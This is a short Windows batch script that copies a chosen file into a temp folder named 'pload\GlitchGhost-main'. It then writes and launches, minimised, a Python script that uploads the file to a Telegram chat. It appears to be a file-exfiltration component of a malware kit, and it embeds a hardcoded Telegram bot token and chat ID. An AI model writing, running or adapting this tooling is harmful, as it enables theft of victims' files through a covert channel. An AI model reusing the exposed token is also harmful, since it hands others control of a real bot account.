@echo off
set /p file_path="Enter the full path of the file to send to Telegram: "

:: Define the destination folder
set temp_folder=%TEMP%\pload\GlitchGhost-main

:: Create the folder if it doesn't exist
if not exist "%temp_folder%" (
    mkdir "%temp_folder%"
)

:: Copy the file to the temporary folder
copy "%file_path%" "%temp_folder%\"

:: Check if the copy was successful
if %ERRORLEVEL% equ 0 (
    echo File copied successfully to %temp_folder%
) else (
    echo Error copying the file.
    exit /b 1
)

:: Extract the file name and extension
for %%F in ("%file_path%") do set file_name=%%~nxF

:: Write the Python script to files.py
echo import sys > files.py
echo # Add the directory where 'requests' is located >> files.py
echo sys.path.insert(0, r'C:\\Python\\Lib\\site-packages') >> files.py
echo import telegram >> files.py
echo import asyncio >> files.py
echo. >> files.py
echo # Set your Telegram bot token and chat ID >> files.py
echo BOT_TOKEN = '7866483331:AAFLe0iNc5VrdZkrByBrDGfr4asHeZi2O9Q' >> files.py
echo CHAT_ID = '2044432474' >> files.py
echo. >> files.py
echo # Save the copied file path in the temp folder >> files.py
echo output_file = "%file_name%" >> files.py
echo. >> files.py
echo async def send_file_to_telegram(token, chat_id, file_path): >> files.py
echo     bot = telegram.Bot(token=token) >> files.py
echo     try: >> files.py
echo         with open(file_path, 'rb') as file: >> files.py
echo             await bot.send_document(chat_id=chat_id, document=file) >> files.py
echo         print("File sent to Telegram.") >> files.py
echo     except Exception as e: >> files.py
echo         print(f"Error sending file: {e}") >> files.py
echo. >> files.py
echo # Run the asynchronous function >> files.py
echo asyncio.run(send_file_to_telegram(BOT_TOKEN, CHAT_ID, output_file)) >> files.py

:: Run the Python script
start /min C:\Python\python files.py
